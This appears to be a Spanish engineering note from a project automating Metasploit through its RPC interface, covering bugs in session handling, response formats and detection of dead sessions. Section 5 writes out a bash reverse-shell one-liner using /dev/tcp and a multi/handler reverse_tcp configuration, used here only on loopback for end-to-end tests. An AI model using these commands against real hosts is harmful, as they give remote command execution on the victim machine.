# SESSION_INTERACT_RECON — interacción con sesiones + REPL stateful

Rama `feat/session-interact` (creada desde `fabfe17`). Reconocimiento hecho con
la **fuente del RPC** de Metasploit instalado
(`/opt/metasploit-framework/embedded/framework/lib/msf/core/rpc/v10/rpc_session.rb`)
y **verificado empíricamente** contra el msfrpcd vivo (6.5.3-dev), siempre en
loopback y sin tocar ningún host externo.

## 1. Dos defectos reales encontrados en el código de la misión anterior

### 1.1 `_rpc` no podía decodificar `session.list` con sesiones

`session.list` devuelve un mapa **con claves enteras** (el `sid`). El cliente
llamaba `msgpack.unpackb(content, raw=False)`, cuyo `strict_map_key=True` por
defecto **rechaza claves int**:

```
MetasploitError: invalid RPC response        # con ≥1 sesión
```

Con cero sesiones `session.list` responde `{}` y el bug quedaba oculto. Es
decir: `list_sessions()` no podía devolver nunca una lista no vacía.

**Arreglado** en `_rpc` con `strict_map_key=False`.

### 1.2 `session.stop` recibe el `sid`, no el uuid

`rpc_stop(sid)` hace `framework.sessions[sid.to_i]`. Pasar el uuid
(`"oda1hox6".to_i == 0`) devuelve HTTP 500 "Unknown Session ID", que el cliente
traduce a `MetasploitError("RPC HTTP error")`. Verificado en vivo:

```
stop(uuid) -> MetasploitError RPC HTTP error
stop(sid):  {'result': 'success'}
```

`stop_session(uuid)` de la misión 8 estaba roto (no se detectó porque el E2E no
llegó a tener una sesión viva). **Hay que resolver uuid → sid antes del RPC.**

## 2. Formato exacto de `session.list`

Claves del mapa: `sid` (**int**). Valor por sesión:

```json
{
 "5": {"type": "shell", "tunnel_local": "127.0.0.1:45455",
        "tunnel_peer": "127.0.0.1:57854", "via_exploit": "exploit/multi/handler",
        "via_payload": "payload/linux/x64/shell_reverse_tcp",
        "desc": "Command shell", "info": "", "workspace": "",
        "session_host": "127.0.0.1", "session_port": 57854, "target_host": "",
        "username": "root", "uuid": "lbeol81j", "exploit_uuid": "6imqtb91",
        "routes": "", "arch": "x64"}
}
```

Notas:
- El `uuid` de Metasploit es **corto** (`lbeol81j`, 8 chars), no un UUID RFC.
- `platform` solo aparece en sesiones `meterpreter`.
- `target_host`/`info` pueden venir vacíos en sesiones abiertas por un handler.
- El `sid` es lo único que aceptan los RPC de sesión.

## 3. Nombres y formatos reales de write/read (MSF 6.5)

| RPC | Params | Respuesta | Notas |
|---|---|---|---|
| `session.shell_write` | `[sid, data]` | `{"write_count": "N"}` | solo type `shell`/`powershell`; **NO añade `\n`** |
| `session.shell_read` | `[sid]` | `{"seq": 0, "data": "..."}` | error 500 si la sesión está desconectada |
| `session.meterpreter_write` | `[sid, data]` | `{"result": "success"}` | alias de `session.interactive_write`; **sí añade `\n`** |
| `session.meterpreter_read` | `[sid]` | `{"data": "..."}` | alias de `session.interactive_read` |
| `session.interactive_write` | `[sid, data]` | `{"result": "success"}` | meterpreter + shell + powershell + db/smb/ldap |
| `session.interactive_read` | `[sid]` | `{"data": "..."}` | para shell delega en `shell_read` |
| `session.stop` | `[sid]` | `{"result": "success"}` | 500 "Unknown Session ID" si no existe |

`session.meterpreter_write` → `rpc_interactive_write`: si el tipo está en
`SHELL_SESSION_TYPES = [shell, powershell]`, hace `data + "\n"` y
`session.shell_write`; si no, encola `console.run_single` en un hilo.

**Lecturas vacías**: devuelven `{"seq": 0, "data": ""}` / `{"data": ""}`,
**nunca null**.

**Latencia típica del output**: para una shell local, el output apareció en la
primera lectura posterior al write (~0.5-2 s). No hay notificación; hay que
hacer polling.

**Flakiness observada**: `session.meterpreter_write` (que internamente usa
`interactive_write` → `shell_write`) devolvió **una vez** HTTP 500 sobre una
sesión shell viva, mientras que `session.shell_write` directo funcionó siempre.
Conclusión de diseño: para sesiones shell/powershell usar los RPC
`session.shell_*` específicos; `interactive_*`/`meterpreter_*` quedan para
meterpreter.

## 4. Detección de sesión muerta

Verificado matando el proceso víctima en localhost:

| t | `session.list` | `session.shell_read` |
|---|---|---|
| +2 s | `[]` (ya no aparece) | `MetasploitError: RPC HTTP error` |
| +4 s | `[]` | — |

Es decir, **ambos** mecanismos sirven, y el RPC falla antes o a la vez que la
lista se vacía. Se implementan los dos (el contrato de la misión pide
`session.list`, y el fallo del RPC es la red de seguridad cuando la lista aún
no se ha actualizado).

## 5. Cómo fabricar una sesión local para el E2E (loopback, 127.0.0.1)

```ruby
module.execute ["exploit", "multi/handler",
  {"PAYLOAD": "linux/x64/shell_reverse_tcp", "LHOST": "127.0.0.1",
   "LPORT": "45455", "ExitOnSession": "false"}]
```

y una "víctima" en el propio host:

```bash
exec 3<>/dev/tcp/127.0.0.1/45455
while IFS= read -r line <&3; do eval "$line" >&3 2>&1; done
```

Resultado real: sesión `shell` creada, `id` devuelve
`uid=1000(operator) gid=1000(operator) ...`. El script de víctima se validó
además contra un listener Python plano (funciona independientemente de msf).

Hallazgo: con `cmd/unix/reverse` **no** se creó sesión en este entorno; con
`linux/x64/shell_reverse_tcp` sí (en todas las pruebas). El E2E usa el segundo.

Limpieza: `session.stop <sid>` + `job.stop <job_id>`; tras matar la víctima la
sesión desaparece sola.

## 6. Puntos de integración del REPL

- `OmniSession.run_objective` ya construye `ExecutionContext` y llama a
  `run_react_loop`; hay que añadir una ruta por sesión que use
  `execute_tool` + el mismo gate de aprobación.
- `nexus_core/agent/react.py::_operator_approval_gate` implementa exactamente
  policy → `on_approval_needed` → `approval_id`; **se reutiliza** para que el
  comando de sesión pase por el mismo camino que cualquier tool (policy,
  approval, audit) sin duplicar lógica ni divergir.
- `make_approval_callback(...)` ya soporta `trust_mode`.
- `COMMANDS` en `cli/commands.py` es un dict `name -> fn(session, args)`.

## 7. Decisiones derivadas del reconocimiento

1. Toda la API de sesiones del cliente es **por uuid** (como en el resto del
   proyecto); la resolución uuid → sid se hace con `session.list` en un helper
   privado y se reutiliza en `stop_session`, los write/read y `run_in_session`.
2. `session.kill` (uuid) se arregla resolviendo el sid; se añade test.
3. "Quiet" se implementa como **N polls consecutivos sin datos nuevos**
   (`ceil(quiet_seconds / poll_interval_seconds)`), no con un reloj real: es
   equivalente en semántica y **determinista** con `asyncio.sleep` parcheado.
   El `max_wait_seconds` sí combina presupuesto de intentos y deadline
   monotónico, como en `execute_exploit`.
4. Para sesiones shell/powershell se usan RPC `session.shell_*`; para
   meterpreter, `session.meterpreter_*`.
5. `/sessions` y la comprobación de sesión viva usan `session.list` **directo**
   (lectura, no ejecuta nada en la sesión); los comandos enviados a la sesión y
   `/kill-session` pasan por `execute_tool`.
